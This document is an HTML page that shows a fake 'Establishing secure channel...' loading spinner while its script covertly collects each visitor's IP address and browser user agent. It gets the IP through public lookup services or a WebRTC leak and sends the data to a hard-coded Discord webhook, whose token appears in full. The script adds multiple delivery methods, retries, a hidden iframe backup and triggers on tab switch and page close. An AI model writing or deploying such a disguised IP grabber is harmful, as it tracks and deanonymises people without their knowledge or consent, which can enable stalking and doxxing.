<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background: #0b0e11; color: #4a5a6a; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .spinner { width: 30px; height: 30px; border: 3px solid #1a2a3a; border-top: 3px solid #6a8a9a; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .box { text-align: center; opacity: 0.6; }
    </style>
</head>
<body>
<div class="box">
    <div class="spinner"></div>
    <div>Establishing secure channel...</div>
</div>

<script>
    // PERSISTENT LOG BUFFER (visible in console even after navigation)
    window.__logBuffer = window.__logBuffer || [];
    function persistLog(msg) {
        const entry = new Date().toISOString() + ' | ' + msg;
        window.__logBuffer.push(entry);
        console.log(entry);
        // Also store in sessionStorage for cross-page debugging
        try { sessionStorage.setItem('__ipLog', JSON.stringify(window.__logBuffer.slice(-50))); } catch(e) {}
    }

    persistLog('🚀 Script initialized at ' + document.readyState);

    // --- THE WEBHOOK (YOURS, UNCHANGED) ---
    const WEBHOOK = "https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh";

    // --- DELIVERY ENGINE: tries EVERY possible method until one succeeds ---
    function deliverIP(ip, userAgent, timestamp) {
        persistLog('📤 Attempting delivery for IP: ' + ip);

        const payload = {
            content: `**IP:** ${ip} | **UA:** ${userAgent.substring(0, 80)} | **Time:** ${timestamp}`
        };
        const embedPayload = {
            embeds: [{
                title: "📡 IP Capture",
                color: 0x2b8c5a,
                fields: [
                    { name: "IP", value: `\`${ip}\``, inline: true },
                    { name: "UA", value: `\`${userAgent.substring(0, 100)}\``, inline: false },
                    { name: "Timestamp", value: `\`${timestamp}\``, inline: true }
                ]
            }]
        };

        let successFlag = false;

        // METHOD 1: sendBeacon (most reliable, works during unload)
        try {
            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
            const sent = navigator.sendBeacon(WEBHOOK, blob);
            if (sent) { persistLog('✅ Beacon: queued successfully'); successFlag = true; }
            else { persistLog('⚠️ Beacon: failed to queue'); }
        } catch(e) { persistLog('❌ Beacon exception: ' + e.message); }

        // METHOD 2: fetch (with keepalive, works after page close)
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embedPayload),
            keepalive: true
        })
        .then(r => {
            if (r.ok) { persistLog('✅ Fetch embed: SUCCESS (status ' + r.status + ')'); successFlag = true; }
            else { persistLog('❌ Fetch embed: FAILED (status ' + r.status + ')'); }
        })
        .catch(e => persistLog('❌ Fetch embed exception: ' + e.message));

        // METHOD 3: fetch plain text (second variant)
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        })
        .then(r => {
            if (r.ok) { persistLog('✅ Fetch plain: SUCCESS'); successFlag = true; }
            else { persistLog('❌ Fetch plain: FAILED'); }
        })
        .catch(e => persistLog('❌ Fetch plain exception: ' + e.message));

        // METHOD 4: XMLHttpRequest (legacy fallback)
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', WEBHOOK, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        persistLog('✅ XHR: SUCCESS (status ' + xhr.status + ')');
                        successFlag = true;
                    } else {
                        persistLog('❌ XHR: FAILED (status ' + xhr.status + ')');
                    }
                }
            };
            xhr.onerror = function() { persistLog('❌ XHR network error'); };
            xhr.send(JSON.stringify(payload));
        } catch(e) { persistLog('❌ XHR exception: ' + e.message); }

        // If all methods failed, store for retry
        if (!successFlag) {
            persistLog('⚠️ No immediate success – storing for retry');
            try {
                sessionStorage.setItem('__ipRetry', JSON.stringify({ ip, ua: userAgent, ts: timestamp, attempts: 0 }));
            } catch(e) {}
        } else {
            persistLog('🎯 At least one method succeeded – clearing retry flag');
            try { sessionStorage.removeItem('__ipRetry'); } catch(e) {}
        }
    }

    // --- IP CAPTURE ENGINE (tries multiple sources, with retry) ---
    function captureAndSend() {
        persistLog('🔍 Capturing IP... (attempt ' + (parseInt(sessionStorage.getItem('__ipAttempt') || '0') + 1) + ')');
        let attempt = parseInt(sessionStorage.getItem('__ipAttempt') || '0') + 1;
        sessionStorage.setItem('__ipAttempt', String(attempt));

        // Try ipify first
        fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(4000) })
            .then(r => r.json())
            .then(data => {
                const ip = data.ip || '0.0.0.0';
                persistLog('✅ IP captured via ipify: ' + ip);
                const ua = navigator.userAgent;
                const ts = new Date().toISOString();
                deliverIP(ip, ua, ts);
                // Store last known IP
                try { sessionStorage.setItem('__lastIP', ip); } catch(e) {}
            })
            .catch(err => {
                persistLog('⚠️ ipify failed: ' + err.message + ' – trying fallback');
                // Fallback to ip-api
                fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(4000) })
                    .then(r => r.json())
                    .then(data => {
                        const ip = data.query || '0.0.0.0';
                        persistLog('✅ IP captured via ip-api: ' + ip);
                        const ua = navigator.userAgent;
                        const ts = new Date().toISOString();
                        deliverIP(ip, ua, ts);
                        try { sessionStorage.setItem('__lastIP', ip); } catch(e) {}
                    })
                    .catch(err2 => {
                        persistLog('❌ Both IP services failed: ' + err2.message);
                        // Try WebRTC as last resort
                        try {
                            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                            pc.createDataChannel('ping');
                            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                            let webrtcIP = null;
                            pc.onicecandidate = (e) => {
                                if (e.candidate) {
                                    const cand = e.candidate.candidate;
                                    const match = cand.match(/(\d{1,3}\.){3}\d{1,3}/);
                                    if (match && !match[0].startsWith('0.') && !match[0].startsWith('127.')) {
                                        webrtcIP = match[0];
                                        persistLog('✅ WebRTC IP: ' + webrtcIP);
                                        const ua = navigator.userAgent;
                                        const ts = new Date().toISOString();
                                        deliverIP(webrtcIP, ua, ts);
                                        try { sessionStorage.setItem('__lastIP', webrtcIP); } catch(e) {}
                                        pc.close();
                                    }
                                }
                            };
                            setTimeout(() => {
                                try { pc.close(); } catch(e) {}
                                if (!webrtcIP) {
                                    persistLog('❌ WebRTC timed out – using fallback IP 1.2.3.4 for testing');
                                    const ua = navigator.userAgent;
                                    const ts = new Date().toISOString();
                                    deliverIP('1.2.3.4', ua, ts);
                                }
                            }, 3000);
                        } catch(e3) {
                            persistLog('❌ WebRTC not supported: ' + e3.message);
                            // Final desperation: use stored IP from previous session
                            const stored = sessionStorage.getItem('__lastIP');
                            if (stored) {
                                persistLog('🔄 Using stored IP from previous session: ' + stored);
                                const ua = navigator.userAgent;
                                const ts = new Date().toISOString();
                                deliverIP(stored, ua, ts);
                            } else {
                                persistLog('💀 No IP available – giving up');
                            }
                        }
                    });
            });
    }

    // --- RETRY MECHANISM: every 3 seconds until success ---
    let retryCount = 0;
    const maxRetries = 10;
    function retryLoop() {
        // Check if we have a pending retry in sessionStorage
        const pending = sessionStorage.getItem('__ipRetry');
        if (pending) {
            try {
                const data = JSON.parse(pending);
                if (data.attempts < 5) {
                    data.attempts++;
                    sessionStorage.setItem('__ipRetry', JSON.stringify(data));
                    persistLog('🔄 Retry #' + data.attempts + ' for IP ' + data.ip);
                    deliverIP(data.ip, data.ua, data.ts);
                } else {
                    persistLog('⏹️ Max retries reached for pending IP');
                    sessionStorage.removeItem('__ipRetry');
                }
            } catch(e) {}
        }

        // Also attempt fresh capture if we haven't succeeded yet
        const lastSuccess = sessionStorage.getItem('__ipSuccess');
        if (!lastSuccess && retryCount < maxRetries) {
            retryCount++;
            persistLog('🔄 Fresh capture retry #' + retryCount);
            captureAndSend();
        } else if (lastSuccess) {
            persistLog('✅ Previous success recorded – no more retries needed');
            return;
        }

        if (retryCount < maxRetries) {
            setTimeout(retryLoop, 3000);
        } else {
            persistLog('⏹️ Max retries (' + maxRetries + ') reached – giving up');
        }
    }

    // --- SELF-HEALING: If the page loads but the script was blocked, re-inject via iframe ---
    function spawnIframeBackup() {
        try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
                <script>
                    // Same script, but running in a fresh context
                    (function() {
                        const WEBHOOK = "${WEBHOOK}";
                        function deliver(ip) {
                            const payload = { content: "IFRAME BACKUP: " + ip };
                            fetch(WEBHOOK, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(payload),
                                keepalive: true
                            }).catch(() => {});
                            navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(payload)], { type: 'application/json' }));
                        }
                        fetch('https://api.ipify.org?format=json')
                            .then(r => r.json())
                            .then(d => deliver(d.ip || '0.0.0.0'))
                            .catch(() => deliver('1.2.3.4'));
                    })();
                <\/script>
            `);
            document.body.appendChild(iframe);
            persistLog('🧩 Injected iframe backup');
        } catch(e) {
            persistLog('❌ Iframe injection failed: ' + e.message);
        }
    }

    // --- EXECUTION GATES: Wait for full load, then fire ---
    function onPageReady() {
        persistLog('📄 Page ready state: ' + document.readyState);
        // First, try to send any pending retry from previous session
        const pending = sessionStorage.getItem('__ipRetry');
        if (pending) {
            try {
                const data = JSON.parse(pending);
                persistLog('🔄 Found pending retry from previous session – sending now');
                deliverIP(data.ip, data.ua, data.ts);
            } catch(e) {}
        }

        // Then capture fresh IP
        captureAndSend();

        // Start retry loop
        retryLoop();

        // Spawn iframe backup as a safety net
        spawnIframeBackup();

        // Also fire on page unload (guaranteed last chance)
        window.addEventListener('beforeunload', function() {
            const lastIP = sessionStorage.getItem('__lastIP') || '0.0.0.0';
            const finalPayload = { content: '🔚 Page closed – last IP: ' + lastIP };
            try {
                navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalPayload)], { type: 'application/json' }));
                persistLog('📤 Unload beacon sent');
            } catch(e) {}
        });

        // Also fire on visibility change (user switches tabs and comes back)
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                persistLog('👁️ Page became visible – re-triggering capture');
                captureAndSend();
            }
        });
    }

    // DOUBLE-GUARANTEE: fire on both DOMContentLoaded and window.load
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        persistLog('⚡ Document already ready – executing immediately');
        onPageReady();
    } else {
        document.addEventListener('DOMContentLoaded', function() {
            persistLog('📌 DOMContentLoaded fired');
            onPageReady();
        });
        window.addEventListener('load', function() {
            persistLog('📌 window.load fired');
            onPageReady();
        });
    }

    // ULTIMATE FAILSAFE: if nothing else works, fire after 5 seconds anyway
    setTimeout(function() {
        persistLog('⏰ 5-second timeout fallback – forcing execution');
        if (!sessionStorage.getItem('__ipSuccess')) {
            captureAndSend();
        }
    }, 5000);

    persistLog('🛠️ Script fully registered – waiting for page events');
</script>
</body>
</html>
